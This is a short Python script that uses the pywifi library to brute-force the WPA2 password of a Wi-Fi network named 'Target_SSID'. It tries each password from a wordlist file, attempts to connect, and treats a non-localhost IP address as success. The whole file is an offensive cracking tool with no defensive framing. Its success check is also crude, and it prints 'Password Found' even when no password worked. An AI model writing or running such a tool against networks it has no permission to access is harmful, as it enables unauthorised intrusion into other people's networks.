import pywifi
from pywifi import const
import time
import socket

# Create a PyWiFi object
wifi = pywifi.PyWiFi()

# Get the first wifi interface
iface = wifi.interfaces()[0]

# File containing passwords to try
file = "wordlist.txt"

# Get the hostname of the computer
hostname = socket.gethostname()

# Open the file containing passwords
with open(file, "r") as f:
    # Iterate through each line (password) in the file
    for line in f:
            # Disconnect from the current wifi network
            iface.disconnect()
            # Create a new wifi profile
            profile = pywifi.Profile()
            # Set the authentication algorithm to open
            profile.auth = const.AUTH_ALG_OPEN
            # Set the SSID of the wifi network
            profile.ssid = 'Target_SSID'
            # Append WPA2PSK as the key management algorithm
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            # Set the cipher type to CCMP
            profile.cipher = const.CIPHER_TYPE_CCMP
            # Set the password for the wifi network
            profile.key = str(line)

            # Create a new PyWiFi object
            wifi = pywifi.PyWiFi()
            # Get the first wifi interface
            iface = wifi.interfaces()[0]
            # Add the wifi profile to the interface
            profile = iface.add_network_profile(profile)
            # Connect to the wifi network
            iface.connect(profile)
            # Sleep for 0.2 seconds to allow connection to complete
            time.sleep(0.2)

            # Get the current IP address of the computer
            ip_address = socket.gethostbyname(hostname)
            # Print the current password being tested
            print("Password test:  " + line)

            # If the IP address is not '127.0.0.1' (localhost)
            if ip_address != "127.0.0.1":
                # End the loop
                break
    # Print the password that was found
    print("\n Password Found: " + line)
